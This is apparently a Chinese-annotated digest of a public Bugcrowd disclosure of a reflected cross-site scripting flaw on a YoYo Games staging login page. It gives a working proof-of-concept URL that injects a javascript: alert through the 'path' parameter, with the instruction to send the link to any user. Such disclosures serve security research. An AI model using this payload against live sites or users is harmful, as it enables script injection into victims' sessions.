# Reflected cross site scripting in login page - CrowdStream - Bugcrowd
目标站点: accountsstage.yoyogames.com
报告地址: https://bugcrowd.com/disclosures/63a1d77c-df3b-4a1a-95fe-d5aa474fb9b7/reflected-cross-site-scripting-in-login-page

## 触发 URL
- https://accountsstage.yoyogames.com/login
- https://accountsstage.yoyogames.com/login?path=javascript:alert(%27KD%27

## 利用方法
关键描述:
- Reflected cross site scripting in login page - CrowdStream - Bugcrowd
- Reflected cross site scripting in login page
- One of Opera's endpoint that is vulnerable to an injection vulnerability - namely a reflected injection of JavaScript, also known as Reflected Cross-Site Scripting (XSS)
关键 Payload:
- `1) Send this link to any user https://accountsstage.yoyogames.com/login?path=javascript:alert(%27KD%27)`
